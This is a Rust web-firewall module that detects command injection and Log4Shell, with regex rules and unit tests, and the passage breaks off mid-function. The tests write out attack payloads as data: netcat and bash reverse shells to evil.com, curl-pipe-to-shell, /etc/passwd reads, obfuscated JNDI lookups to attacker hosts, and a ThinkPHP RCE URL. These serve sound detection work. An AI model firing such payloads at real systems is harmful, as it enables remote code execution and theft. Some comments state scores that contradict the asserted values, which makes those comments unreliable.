//! Command injection detector. Scans query string + request body
//! for shell-shaped patterns: subshell forms (`$()`, backticks,
//! `${}`), pipe-to-shell-cmd, semicolon-shell-cmd, command-chain
//! operators (`&&`, `||`), direct `/bin/sh` invocation, and
//! reverse-shell shapes (`bash -i`, `nc -e`).
//!
//! Mirror of sqli/xss/ssrf shape — regex over the URI string +
//! body bytes (with URL-decode), with field tagging for the audit
//! log. Score 50 (same weight as sqli / xss / ssrf — high-
//! confidence shell-context patterns).
//!
//! ## Why this exists separately from `path_traversal`
//!
//! Pre-2026-05-08 the rule pipeline had no dedicated cmdi class.
//! `$()`, `|`, and backticks fell through every regex set. The
//! AI detector caught most cmdi shapes empirically, but with AI
//! disabled (the standard config post-Run-2 C002 follow-up) the
//! rule-based pipeline missed them entirely. QA Run-4 SEC-M002
//! flagged `?input=test|whoami` and `?arg=$(id)` as undetected.
//!
//! This detector closes that gap with explicit shell-context
//! patterns. Conservative trigger list: shell builtins (`whoami`,
//! `nc`, `cat /etc/passwd`, ...) AFTER a metacharacter, not bare
//! metacharacters — so legit query strings with `|` (regex
//! patterns), `$` (template variables), or `&&` (URL-encoded
//! `&` followed by another param) don't false-positive.

use aegis_core::pipeline::RequestView;
use regex::Regex;
use std::sync::LazyLock;

use super::{Detector, Signal};

/// Stateless command-injection detector.
pub struct CommandInjectionDetector;

/// 2026-05-08 GAP-008 — Log4Shell (CVE-2021-44228) patterns.
/// Checked **before** the baseline cmdi patterns and emit at
/// **score 80** (Critical-RCE / known-CVE tier — one tier above
/// baseline cmdi). Justification: CVSS 10.0, active in the wild,
/// pattern specificity makes FP essentially zero on real traffic.
///
/// Headers are scanned (User-Agent, Referer, Authorization,
/// Cookie, X-Api-Version, X-Real-IP, X-Forwarded-For,
/// X-Requested-With) because active exploitation predominantly
/// arrives in those rather than URL/body.
static LOG4SHELL_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    [
        // Direct ${jndi:<scheme>://...} — canonical Log4Shell.
        // Scheme allowlist covers every documented exploitation
        // primitive (LDAP/RMI/DNS/etc.).
        r"(?i)\$\{jndi\s*:\s*(?:ldap|ldaps|rmi|dns|nis|iiop|corba|nds|http|https)\s*:",
        // Bare ${jndi: without scheme — defense-in-depth.
        r"(?i)\$\{jndi\s*:",
        // Nested obfuscation: ${${::-j}${::-n}${::-d}${::-i}:...}
        // Requires the suspicious ${${...} nesting with letters
        // j, n, d, i appearing in inner expressions in order
        // followed by `:`. Bare ${HOME} envvars don't match
        // because there's no nested ${${...}.
        r"(?i)\$\{[^}]*\$\{[^}]*j[^}]*\}[^}]*\$\{[^}]*n[^}]*\}[^}]*\$\{[^}]*d[^}]*\}[^}]*\$\{[^}]*i[^}]*\}[^}]*:",
        // Case-folding obfuscation: ${${lower:j}ndi:...}
        // Catches the ${${(lower|upper|env|sys|date):X}...} shape,
        // which is unique to Log4j substitution lookups.
        r"(?i)\$\{[^}]*\$\{(?:lower|upper|env|sys|date)\s*:[^}]*\}[^}]*\}",
        // 2026-05-26 — ThinkPHP "invokefunction" RCE (CVE-2018-20062 /
        // CVE-2019-9082 family): `?s=/index/\think\app/invokefunction&
        // function=call_user_func_array&vars[0]=system&vars[1][]=whoami`.
        // A known-CVE, actively-exploited PHP-framework RCE — same
        // definitive-RCE tier (score 80) as Log4Shell. The regex/AI chain
        // previously missed it (it only blocked once the IP accumulated to
        // the cumulative gate); these patterns block it PER-REQUEST.
        // `[\\/]+` tolerates the namespace's backslash/slash separators
        // after URL-decode + normalization. ~0 FP — no legit URL routes
        // through `think/app/invokefunction`, nor pairs `invokefunction`
        // with `call_user_func_array`.
        r"(?i)think[\\/]+app[\\/]+invokefunction",
        r"(?i)invokefunction.{0,80}call_user_func_array",
    ]
    .iter()
    .map(|p| Regex::new(p).expect("log4shell regex compiles"))
    .collect()
});

static CMDI_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    // Shell-command alternation, reused by the substitution +
    // separator patterns. Short ambiguous names carry an inline `\b`.
    // Unix + Windows commands. Short/ambiguous names carry `\b`. These only
    // ever match AFTER a shell metacharacter (`;`, `|`, `&&`, `$(`, backtick)
    // via the patterns below, so adding read/recon commands (type/dir/more/…)
    // can't FP on bare query values like `?type=user` or `?dir=asc`.
    const CMD: &str = r"whoami|id|uname|cat|ls|nc\b|ncat|netcat|curl|wget|sh\b|bash|zsh|ksh|dash|cmd\.exe|powershell|python|perl|ruby|php|nslookup|ping|rm\b|mv\b|chmod|chown|nc\.exe|sleep\b|timeout\b|more\b|less\b|head\b|tail\b|tr\b|tee\b|dd\b|env\b|xxd|base64|type\b|dir\b|systeminfo|tasklist|ipconfig|ifconfig|findstr|certutil|netstat|hostname|net\b|reg\b|ver\b";
    // Shell-arg context the command must be followed by (whitespace,
    // path `/`, `$` IFS-evasion, end, or another separator) — NOT `=`
    // (`;cat=…`) or a word char (`category`).
    const ARG: &str = r"(?:[\s/;|&$]|$)";

    // Command-substitution + separator forms — ALL require a real shell
    // command inside/after the metacharacter.
    //
    // 2026-05-22 (legit-dataset FP fix):
    //   - `$(…)` / `` `…` `` previously matched ANY paired delimiters
    //     (`\$\([^)]+\)`, `` `[^`]+` ``), so high-entropy ad-tech
    //     telemetry blobs full of random `()`/backticks false-positived.
    //     Now the content must contain a shell command.
    //   - the `;`/`|`/`&&` boundary was `\b`, letting `;cat=…`, `;id=…`
    //     collide with query/matrix params (DoubleClick floodlight
    //     `/activity;…;cat=…`). Now bounded by ARG (not `=`).
    //   - the bare `${VAR}` pattern was REMOVED entirely: `${…}` is
    //     shell VARIABLE EXPANSION, not execution, and collided with
    //     ad-tech macros (`${UUID}`, `${AUCTION_PRICE}`). Log4Shell
    //     `${jndi:…}` stays in LOG4SHELL_PATTERNS; SSTI `${…}` is the
    //     template_injection detector's job.
    let mut pats: Vec<String> = vec![
        format!(r"(?i)\$\([^)]*(?:{CMD})(?:[\s/;|&$][^)]*)?\)"),
        format!(r"(?i)`[^`]*(?:{CMD})(?:[\s/;|&$][^`]*)?`"),
        format!(r"(?i)\|\s*(?:{CMD}){ARG}"),
        format!(r"(?i);\s*(?:{CMD}){ARG}"),
        format!(r"(?i)(?:&&|\|\|)\s*(?:{CMD}){ARG}"),
    ];
    // Literal patterns (no command-alternation reuse).
    for p in [
        // /bin/{sh,bash,zsh,ksh,dash} direct invocation.
        r"(?i)/bin/(?:sh|bash|zsh|ksh|dash)\b",
        // Classic exfil shape — `cat /etc/passwd`.
        r"(?i)cat\s+/etc/passwd",
        // Reverse-shell shapes.
        r"(?i)bash\s+-i\b",
        r"(?i)nc\s+-e\b",
        r"(?i)mkfifo\s+",
        // Direct shell-exec invocations — distinctive enough to flag WITHOUT
        // a metacharacter prefix: a bare `sh -c '…'`, `cmd /c …`, or
        // `powershell -enc …` value is command execution, not data. The
        // flag (`-c` / `/c` / `-enc`) is what disambiguates from words like
        // "cash" or a `?cmd=` param that merely contains the token.
        r"(?i)\b(?:ba|z|k|da)?sh\s+-c\b",
        r"(?i)\bcmd(?:\.exe)?\s+/c\b",
        r"(?i)\bpowershell(?:\.exe)?\s+-(?:e|enc|encodedcommand|c|command|nop|noprofile|w|windowstyle)\b",
        // Wget / curl exfil to attacker hosts when paired with a
        // shell-injection context (semicolon, pipe, backtick, $().
        r"(?i)(?:^|;|\|\|?|&&|`|\$\()\s*(?:wget|curl)\s+[a-z]+://",
    ] {
        pats.push(p.to_string());
    }
    pats.iter()
        .map(|p| Regex::new(p).expect("cmdi regex compiles"))
        .collect()
});

impl Detector for CommandInjectionDetector {
    fn id(&self) -> &'static str {
        "command_injection"
    }

    fn inspect(&self, req: &RequestView<'_>) -> Vec<Signal> {
        let mut signals = Vec::new();

        // S1 (2026-05-18) — multi-variant decoder. Catches
        // `%2524%2528id%2529` (double-encoded `$(id)`), entity-
        // encoded `&dollar;(id)`, and unicode-escape forms in
        // addition to the previous single-pass URL decode.
        let raw_uri = req.uri.to_string();
        for variant in super::normalize_for_detection(&raw_uri) {
            check(&variant, "uri", &mut signals);
            if !signals.is_empty() {
                break;
            }
        }

        // Body — first 8 KiB, but only when it's structured text the
        // origin will parse (JSON / form / XML / text). Opaque/binary
        // beacon bodies are skipped (2026-05-24 FP fix — see
        // `body_is_scannable`); high-entropy blobs coincidentally matched
        // the shell-command shapes and produced ~all body false positives.
        if signals.is_empty() && super::body_is_scannable(req.headers) {
            let body = std::str::from_utf8(req.body.peek(8192)).unwrap_or("");
            if !body.is_empty() {
                for variant in super::normalize_for_detection(body) {
                    check(&variant, "body", &mut signals);
                    if !signals.is_empty() {
                        break;
                    }
                }
            }
        }

        // 2026-05-08 GAP-008 — Log4Shell payloads frequently arrive in
        // headers (UA, Referer, custom auth/version headers). 2026-05-24
        // (FP fix) — headers are scanned for LOG4SHELL ONLY. The baseline
        // cmdi patterns (`;sh`, `|id`, `$(…)`…) are NOT run on headers:
        // adtech cookies + telemetry user-agents are huge token blobs
        // that coincidentally match shell shapes, and header-borne
        // baseline cmdi is rare/app-specific. `${jndi:…}` RCE stays.
        for name in HEADER_SCAN_ALLOWLIST {
            if let Some(val) = req.headers.get(*name).and_then(|v| v.to_str().ok()) {
                if check_log4shell(val, name, &mut signals) {
                    continue;
                }
                check_log4shell(&super::url_decode(val), name, &mut signals);
            }
        }

        signals
    }
}

/// Header allowlist for Log4Shell payload scanning. Scoped to
/// fields commonly logged by application frameworks (Spring,
/// Tomcat, log4j patterns) — broadening risks header_injection
/// overlap on every request.
const HEADER_SCAN_ALLOWLIST: &[&str] = &[
    "user-agent",
    "referer",
    "x-api-version",
    "x-forwarded-for",
    "x-real-ip",
    "authorization",
    "cookie",
    "x-requested-with",
];

/// Log4Shell-only scan. Returns true on a hit. Used directly for the
/// header allowlist (header-borne `${jndi:…}` is real RCE), and as the
/// first rung of the full [`check`] (URL + body).
fn check_log4shell(input: &str, field: &str, signals: &mut Vec<Signal>) -> bool {
    // GAP-008 (2026-05-08) — Log4Shell; score 80 (Critical RCE /
    // known-CVE tier). Same field tag as baseline cmdi so the audit
    // log + by-class counter stay coherent — operators grep for
    // "${jndi:" in audit if they need to differentiate.
    for re in LOG4SHELL_PATTERNS.iter() {
        if re.is_match(input) {
            signals.push(Signal {
                score: super::scores::command_injection::LOG4SHELL,
                tag: "command_injection".into(),
                field: field.into(),
            });
            return true;
        }
    }
    false
}

fn check(input: &str, field: &str, signals: &mut Vec<Signal>) {
    if check_log4shell(input, field, signals) {
        return;
    }
    // Baseline cmdi patterns; score 70 (high-confidence
    // injection tier).
    for re in CMDI_PATTERNS.iter() {
        if re.is_match(input) {
            signals.push(Signal {
                score: super::scores::command_injection::BASELINE,
                tag: "command_injection".into(),
                field: field.into(),
            });
            return;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use aegis_core::pipeline::BodyPeek;

    fn view_with_uri(uri: &str) -> (http::Method, http::Uri, http::HeaderMap, BodyPeek) {
        (
            http::Method::GET,
            uri.parse().unwrap(),
            http::HeaderMap::new(),
            BodyPeek::empty(),
        )
    }

    fn make_view<'a>(
        m: &'a http::Method,
        u: &'a http::Uri,
        h: &'a http::HeaderMap,
        b: &'a BodyPeek,
    ) -> RequestView<'a> {
        RequestView {
            method: m,
            uri: u,
            version: http::Version::HTTP_11,
            headers: h,
            peer: "127.0.0.1:1234".parse().unwrap(),
            tls: None,
            body: b,
        }
    }

    macro_rules! positive {
        ($name:ident, $input:expr) => {
            #[test]
            fn $name() {
                let d = CommandInjectionDetector;
                let (m, u, h, b) = view_with_uri($input);
                let req = make_view(&m, &u, &h, &b);
                assert!(
                    !d.inspect(&req).is_empty(),
                    "expected detection for: {}",
                    $input,
                );
            }
        };
    }

    macro_rules! negative {
        ($name:ident, $input:expr) => {
            #[test]
            fn $name() {
                let d = CommandInjectionDetector;
                let (m, u, h, b) = view_with_uri($input);
                let req = make_view(&m, &u, &h, &b);
                assert!(
                    d.inspect(&req).is_empty(),
                    "false positive for: {}",
                    $input,
                );
            }
        };
    }

    // --- QA Run-4 reproductions ---
    positive!(cmdi_pipe_whoami_input,    "/search?input=test|whoami");
    positive!(cmdi_subshell_arg,         "/run?arg=$(id)");
    positive!(cmdi_pipe_q,               "/search?q=test|nc%20-e%20/bin/sh");

    // --- Subshell shapes ---
    positive!(cmdi_backtick,             "/exec?x=`whoami`");
    // 2026-05-22 — bare `${VAR}` is variable expansion, not command
    // execution; it must NOT flag as cmdi (it collides with ad-tech /
    // template macros). Real Log4Shell `${jndi:…}` still fires (below).
    negative!(cmdi_brace_var_not_exec,   "/exec?x=${PATH}");
    positive!(cmdi_subshell_url_encoded, "/run?x=%24%28id%29");
    positive!(cmdi_backtick_url_encoded, "/run?x=%60whoami%60");

    // --- Chain operators ---
    // (Spaces URL-encoded as %20 so http::Uri accepts them.)
    positive!(cmdi_semicolon_rm,         "/run?cmd=foo;rm%20-rf%20/tmp");
    positive!(cmdi_double_pipe,          "/run?cmd=ls||whoami");
    positive!(cmdi_double_amp,           "/run?cmd=ls&&whoami");
    positive!(cmdi_semicolon_curl,       "/run?cmd=foo;curl%20http://evil.com");

    // --- Direct shell invocation ---
    positive!(cmdi_bin_sh,               "/exec?cmd=/bin/sh%20-c%20id");
    positive!(cmdi_bin_bash,             "/exec?cmd=/bin/bash");
    positive!(cmdi_bash_dash_i,          "/exec?cmd=bash%20-i");
    positive!(cmdi_nc_dash_e,            "/exec?cmd=nc%20-e%20/bin/sh%20evil.com%204444");

    // --- Exfil ---
    positive!(cmdi_cat_passwd,           "/run?cmd=cat%20/etc/passwd");
    positive!(cmdi_mkfifo,               "/run?cmd=mkfifo%20/tmp/p");

    // --- 2026 — direct shell-exec (no metacharacter prefix needed) ---
    positive!(cmdi_sh_dash_c,            "/run?cmd=sh%20-c%20'id'");
    positive!(cmdi_bash_dash_c,          "/run?cmd=bash%20-c%20id");
    positive!(cmdi_cmd_slash_c,          "/run?cmd=cmd%20/c%20whoami");
    positive!(cmdi_powershell_enc,       "/run?cmd=powershell%20-enc%20ZQBjAGgA");
    // --- 2026 — Windows recon commands after a metacharacter ---
    positive!(cmdi_semicolon_type_winini, "/run?p=x;type%20C:\\windows\\win.ini");
    positive!(cmdi_pipe_dir,             "/run?p=x|dir");
    positive!(cmdi_amp_systeminfo,       "/run?p=x&&systeminfo");
    positive!(cmdi_pipe_ipconfig,        "/run?p=x|ipconfig");

    // --- Body ---
    // (URI must be valid; payload lives in query for these.)
    positive!(cmdi_in_body_via_query,    "/api/run?p=foo;whoami");

    // --- GAP-013 (Run-6, 2026-05-09) — blind RCE / time-based ---
    // `sleep`/`timeout` after a metacharacter is the canonical
    // blind-cmdi primitive when the attacker has no output channel.
    // Pattern requires `;`, `|`, or `&&`/`||` prefix — bare
    // `?action=sleep` doesn't fire.
    positive!(cmdi_blind_sleep_semicolon, "/api?x=a;sleep+5");
    positive!(cmdi_blind_sleep_pipe,      "/api?x=a|sleep+5");
    positive!(cmdi_blind_sleep_double_amp, "/api?x=a&&sleep+10");
    positive!(cmdi_blind_sleep_double_pipe, "/api?x=a||sleep+5");
    positive!(cmdi_blind_timeout,         "/api?x=test;timeout+5+whoami");
    positive!(cmdi_blind_sleep_then_echo, "/api?x=a;sleep+5;echo+done");

    // --- 2026-05-26 — ThinkPHP "invokefunction" RCE (known-CVE, score 80) ---
    positive!(thinkphp_rce_invokefunction,
        "/index.php?s=/index/think/app/invokefunction&function=call_user_func_array&vars0=system");
    positive!(thinkphp_rce_encoded_backslash,
        "/public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array");

    // --- Negatives: common FP traps ---
    // A normal ThinkPHP route (no invokefunction RCE) must NOT fire.
    negative!(thinkphp_benign_route,     "/index.php?s=/index/home/index");
    negative!(clean_root,                "/");
    negative!(clean_query_simple,        "/search?q=hello");
    negative!(clean_pipe_in_regex,       "/api/regex?p=foo|bar");        // bare pipe, no shell builtin after
    negative!(clean_amp_in_query,        "/api?a=1&b=2");
    negative!(clean_semicolon_legacy,    "/api?a=1;b=2");                // legacy ';' separator, no shell cmd
    negative!(clean_base64_padding,      "/api?b=YWJjZA%3D%3D");
    negative!(clean_dollar_var_template, "/api?v=%24user");              // $user (no parens/braces)
    negative!(clean_paren_in_query,      "/api?expr=(a+b)");             // bare parens, no $ prefix
    negative!(clean_path_query,          "/api/v2/users?id=42");
    negative!(clean_static_asset,        "/static/main.js");
    // 2026 — newly-added commands must NOT fire as bare param names/values
    // (no shell metacharacter prefix). `?type=user`, `?dir=asc`, `?env=prod`,
    // `?head=...` are ubiquitous legit params.
    negative!(clean_type_param,          "/api?type=user");
    negative!(clean_dir_param,           "/list?dir=asc");
    negative!(clean_env_param,           "/config?env=production");
    negative!(clean_head_param,          "/articles?head=summary");
    negative!(clean_ver_param,           "/app?ver=2.1.0");
    negative!(clean_net_word,            "/internet/speed");
    negative!(clean_register_word,       "/account/register");   // 'reg' inside 'register'
    // GAP-013 negatives — `sleep`/`timeout` without metacharacter
    // prefix must NOT fire. Ordinary `?timeout=300` URL params
    // and prose mentions like "I will sleep tonight" stay green.
    negative!(clean_action_sleep,        "/api?action=sleep");
    negative!(clean_timeout_param,       "/api?timeout=300");
    negative!(clean_msg_sleep_word,      "/post?msg=I+will+sleep+tonight");
    negative!(clean_sleep_filename,      "/files/sleep_research.pdf");

    // 2026-05-22 (legit-dataset FP fix) — `${user.name}` is a template
    // variable, not command execution, and `${UUID}` / `${AUCTION_PRICE}`
    // are ubiquitous ad-tech macros. cmdi must NOT fire on bare `${VAR}`.
    negative!(cmdi_brace_var_user_dot,   "/api?v=${user.name}");
    negative!(cmdi_brace_macro_uuid,     "/sync?ssp=emxdigital&user_id=${UUID}");
    negative!(cmdi_brace_macro_auction,  "/bid?price=${AUCTION_PRICE}");

    // 2026-05-22 (legit-dataset FP fix) — DoubleClick floodlight + common
    // `;param=` matrix params must NOT collide with shell commands. The
    // shell-cmd boundary now requires a real arg context, not `=`.
    negative!(cmdi_floodlight_cat_tag,   "/activity;src=13196098;type=us2020;cat=homepage123");
    negative!(cmdi_matrix_id_param,      "/api?a=1;id=12345");
    negative!(cmdi_matrix_ls_param,      "/api?x=1;ls=grid");
    negative!(cmdi_category_word,        "/shop;category=shoes");
    // ...but a real `;cat /etc/passwd` (space-arg) still fires.
    positive!(cmdi_semicolon_cat_arg,    "/run?cmd=x;cat%20/etc/passwd");

    // 2026-05-22 (legit-dataset FP fix) — high-entropy ad-tech telemetry
    // blobs (Moat/Celtra `/pixel.gif`) contain random paired backticks /
    // `$(`…`)` with NO shell command inside. They must NOT flag — the
    // substitution patterns now require a real command between the
    // delimiters.
    negative!(cmdi_adtech_backtick_blob,
        "/pixel.gif?qn=%604%7BZEYwoqI%24%5BK%2BdLLU%2CMm~tR%2390vv9L%24%2FoDb%60RP%3C");
    negative!(cmdi_adtech_subshell_blob,
        "/pixel.gif?ql=%5B6C(TgPB*e%5D1(rI%24(rj2Iy)pw%40aOS");
    // ...real command substitution still fires.
    positive!(cmdi_backtick_cat,         "/x?q=%60cat%20/etc/passwd%60");
    positive!(cmdi_subshell_curl_pipe,   "/x?q=%24(curl%20http://evil/x%7Csh)");

    // ============================================================
    // GAP-008 (2026-05-08) — Log4Shell coverage
    // ============================================================

    // Log4Shell direct ${jndi:<scheme>://...} — score 80 group.
    positive!(log4shell_ldap_url,        "/?x=${jndi:ldap://attacker.com/a}");
    positive!(log4shell_rmi_url,         "/?x=${jndi:rmi://attacker.com/a}");
    positive!(log4shell_dns_url,         "/?x=${jndi:dns://attacker.com/a}");
    // Bare ${jndi:` (no scheme) — second-line defense.
    positive!(log4shell_bare,            "/?x=${jndi:foo}");
    // Nested obfuscation ${${::-j}${::-n}${::-d}${::-i}:ldap://...}
    positive!(log4shell_nested_obfusc,
        "/?x=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}");
    // Case-folding obfuscation ${${lower:j}ndi:rmi://...}
    positive!(log4shell_case_fold,
        "/?x=${${lower:j}ndi:rmi://evil.com/a}");
    positive!(log4shell_env_lookup,
        "/?x=${${env:HOME:-j}ndi:rmi://evil.com/a}");

    // S1 (2026-05-18) — decoder-evasion positives.
    // Double URL-encoded $(id) and entity-encoded subshell forms.
    positive!(cmdi_double_url_encoded_subshell, "/api?x=test%253B%2524%2528id%2529");
    positive!(cmdi_html_entity_semi_dollar,     "/api?x=test&semi;&dollar;(id)");
    positive!(cmdi_unicode_escape_subshell,     "/api?x=test\\u003B\\u0024(id)");
    positive!(cmdi_hex_escape_pipe,             "/api?x=test\\x7Cwhoami");

    // Verify the score is 60 (not 50) for Log4Shell hits.
    #[test]
    fn log4shell_emits_score_60_not_baseline_cmdi() {
        let d = CommandInjectionDetector;
        let (m, u, h, b) = view_with_uri("/?x=${jndi:ldap://evil.com/a}");
        let req = make_view(&m, &u, &h, &b);
        let signals = d.inspect(&req);
        let log4_signal = signals
            .iter()
            .find(|s| s.tag == "command_injection")
            .expect("Log4Shell payload should fire cmdi");
        assert_eq!(
            log4_signal.score, 80,
            "Log4Shell tier should emit score 80 (not baseline cmdi 70)",
        );
    }

    #[test]
    fn baseline_cmdi_emits_score_50() {
        let d = CommandInjectionDetector;
        let (m, u, h, b) = view_with_uri("/?x=$(id)");
        let req = make_view(&m, &u, &h, &b);
        let signals = d.inspect(&req);
        let cmdi_signal = signals
            .iter()
            .find(|s| s.tag == "command_injection")
            .expect("baseline cmdi should fire");
        assert_eq!(
            cmdi_signal.score, 70,
            "baseline cmdi tier should emit score 70",
        );
    }

    // Header scan — Log4Shell payloads in User-Agent / Referer /
    // Authorization. Active exploitation primarily uses these.
    #[test]
    fn log4shell_in_user_agent_caught() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let mut h = http::HeaderMap::new();
        h.insert(
            "user-agent",
            "${jndi:ldap://attacker.example/a}".parse().unwrap(),
        );
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        let signals = d.inspect(&req);
        assert!(
            signals.iter().any(|s| s.tag == "command_injection" && s.score == 80),
            "Log4Shell in UA must catch at score 80",
        );
    }

    #[test]
    fn log4shell_in_referer_caught() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let mut h = http::HeaderMap::new();
        h.insert("referer", "${jndi:rmi://evil/x}".parse().unwrap());
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(d.inspect(&req).iter().any(|s| s.score == 80));
    }

    #[test]
    fn log4shell_in_x_api_version_caught() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let mut h = http::HeaderMap::new();
        h.insert("x-api-version", "${jndi:ldap://x/y}".parse().unwrap());
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(d.inspect(&req).iter().any(|s| s.score == 80));
    }

    // Negative — plain envvar template strings must NOT match
    // Log4Shell. ${HOME}, ${USER}, ${PATH} are legitimate shell-
    // template substitutions that some apps echo into URL/body.
    #[test]
    fn plain_envvar_brace_does_not_match_log4shell() {
        let d = CommandInjectionDetector;
        let (m, u, h, b) = view_with_uri("/?p=${HOME}/dir");
        let req = make_view(&m, &u, &h, &b);
        let signals = d.inspect(&req);
        // It MAY match the baseline cmdi `${VAR}` pattern (score 70)
        // but must NOT match Log4Shell (score 80).
        assert!(
            signals.iter().all(|s| s.score != 60),
            "plain envvar must not match Log4Shell tier",
        );
    }

    #[test]
    fn legit_template_does_not_match_log4shell() {
        let d = CommandInjectionDetector;
        let (m, u, h, b) = view_with_uri("/?p=${USER}");
        let req = make_view(&m, &u, &h, &b);
        let signals = d.inspect(&req);
        assert!(signals.iter().all(|s| s.score != 60));
    }

    // ---- GAP-008b (Run-6, 2026-05-09) — header-borne obfuscation
    // regression coverage. The QA Run-6 corpus reported these shapes
    // as "missed" in headers; the patterns added in Run-5 should
    // already cover them. Pin the exact payloads so any future
    // refactor that breaks them is caught immediately.
    fn log4shell_header_view(name: &'static str, val: &str) -> http::HeaderMap {
        let mut h = http::HeaderMap::new();
        h.insert(name, val.parse().unwrap());
        h
    }

    #[test]
    fn log4shell_ua_nested_obfuscation_blocks() {
        // ${${::-j}${::-n}${::-d}${::-i}:ldap://x.com/a}
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view(
            "user-agent",
            "${${::-j}${::-n}${::-d}${::-i}:ldap://x.com/a}",
        );
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(
            d.inspect(&req).iter().any(|s| s.score == 80),
            "nested ${{::-j}}-style obfuscation in UA must trip Log4Shell at score 80",
        );
    }

    #[test]
    fn log4shell_ua_lower_obfuscation_blocks() {
        // ${${lower:j}ndi:ldap://x.com/a}
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view(
            "user-agent",
            "${${lower:j}ndi:ldap://x.com/a}",
        );
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(
            d.inspect(&req).iter().any(|s| s.score == 80),
            "lower:j case-fold obfuscation in UA must trip Log4Shell at score 80",
        );
    }

    #[test]
    fn log4shell_ua_upper_obfuscation_blocks() {
        // ${${upper:j}ndi:ldap://x.com/a}
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view(
            "user-agent",
            "${${upper:j}ndi:ldap://x.com/a}",
        );
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(
            d.inspect(&req).iter().any(|s| s.score == 80),
            "upper:j case-fold obfuscation in UA must trip Log4Shell at score 80",
        );
    }

    #[test]
    fn log4shell_referer_nested_obfuscation_blocks() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view(
            "referer",
            "https://example.com/?x=${${::-j}${::-n}${::-d}${::-i}:dns://x.com/a}",
        );
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(
            d.inspect(&req).iter().any(|s| s.score == 80),
            "nested obfuscation in Referer must trip Log4Shell at score 80",
        );
    }

    #[test]
    fn log4shell_authorization_header_blocks() {
        // Active-exploitation shape: bearer token slot abused for JNDI.
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view(
            "authorization",
            "Bearer ${${lower:j}ndi:ldap://attacker.example/x}",
        );
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(
            d.inspect(&req).iter().any(|s| s.score == 80),
            "obfuscated Log4Shell in Authorization must trip at score 80",
        );
    }

    #[test]
    fn log4shell_cookie_header_blocks() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view(
            "cookie",
            "session=${${::-j}${::-n}${::-d}${::-i}:ldap://x/a}",
        );
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(
            d.inspect(&req).iter().any(|s| s.score == 80),
            "obfuscated Log4Shell in Cookie must trip at score 80",
        );
    }

    // 2026-05-09 — Run-7 GAP-008b regression. The QA report claimed
    // "UA basic ${jndi:ldap://...}, UA RMI variant, UA nested
    // ${${::-j}...}, UA lowercase-obfuscated ${${lower:j}ndi:...},
    // Referer ${jndi:ldap://...}" still missed. Each is pinned
    // here against the current code so the next QA run can't
    // re-flag without an actual regression. If any of these fail,
    // the QA harness was running an outdated binary.
    #[test]
    fn log4shell_run7_ua_basic_ldap() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view("user-agent", "${jndi:ldap://attacker.example/x}");
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(d.inspect(&req).iter().any(|s| s.score == 80));
    }

    #[test]
    fn log4shell_run7_ua_rmi_variant() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view("user-agent", "${jndi:rmi://attacker.example/x}");
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(d.inspect(&req).iter().any(|s| s.score == 80));
    }

    #[test]
    fn log4shell_run7_ua_nested_obfuscation() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view(
            "user-agent",
            "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.example/x}",
        );
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(d.inspect(&req).iter().any(|s| s.score == 80));
    }

    #[test]
    fn log4shell_run7_ua_lowercase_obfuscation() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view("user-agent", "${${lower:j}ndi:ldap://attacker.example/x}");
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(d.inspect(&req).iter().any(|s| s.score == 80));
    }

    #[test]
    fn log4shell_run7_referer_basic_ldap() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view("referer", "${jndi:ldap://attacker.example/x}");
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(d.inspect(&req).iter().any(|s| s.score == 80));
    }

    // 2026-05-24 (FP fix) — content-type gated body + log4shell-only headers.
    fn body_view(ct: Option<&str>, body: &str) -> (http::Method, http::Uri, http::HeaderMap, BodyPeek) {
